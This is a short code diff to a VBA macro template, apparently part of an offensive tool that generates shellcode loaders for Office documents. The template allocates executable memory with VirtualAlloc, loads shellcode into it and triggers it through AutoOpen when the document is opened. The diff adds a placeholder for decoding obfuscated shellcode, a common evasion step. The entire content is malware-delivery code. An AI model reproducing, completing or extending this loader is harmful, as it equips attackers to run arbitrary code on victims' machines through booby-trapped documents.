@@ -12,6 +12,7 @@ Function {MACRO_NAME}()
     Dim res As LongPtr
     
     {SHELLCODE}
+    {DECODE}
 
     addr = VirtualAlloc(0, UBound({SHELLCODE_NAME}), &H3000, &H40)
     
@@ -30,3 +31,5 @@ End Sub
 Sub AutoOpen()
     {MACRO_NAME}
 End Sub
+
+{DECODE_VBA_FUNC}
